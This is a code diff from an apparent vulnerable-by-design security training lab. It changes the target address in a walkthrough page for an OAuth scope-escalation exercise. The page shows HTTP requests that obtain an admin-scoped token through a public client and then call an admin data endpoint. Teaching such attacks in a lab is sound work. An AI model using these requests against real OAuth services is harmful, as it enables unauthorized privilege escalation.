@@ -69,15 +69,15 @@ router.get('/scope-upgrade', (req, res) => {
           <code>client_id=pentrix-spa</code> (a public client, no secret needed).</li>
         <li>Call <code>GET /oauth/idp/admin-data?access_token=...</code>.</li>
       </ol>
-      ${payloadBlock('Authorize with scope=admin', 'http://localhost:3000' + href)}
+      ${payloadBlock('Authorize with scope=admin', 'http://<your-lab-address>' + href)}
       ${payloadBlock('Burp Repeater (token exchange)', `POST /oauth/idp/token HTTP/1.1
-Host: localhost:3000
+Host: <your-lab-address>
 Content-Type: application/x-www-form-urlencoded
 Cookie: connect.sid=<PASTE_YOUR_SESSION_COOKIE>
 
 client_id=pentrix-spa&code=<CODE>`)}
       ${payloadBlock('Burp Repeater (admin data)', `GET /oauth/idp/admin-data?access_token=<TOKEN> HTTP/1.1
-Host: localhost:3000
+Host: <your-lab-address>
 Cookie: connect.sid=<PASTE_YOUR_SESSION_COOKIE>
 
 `)}
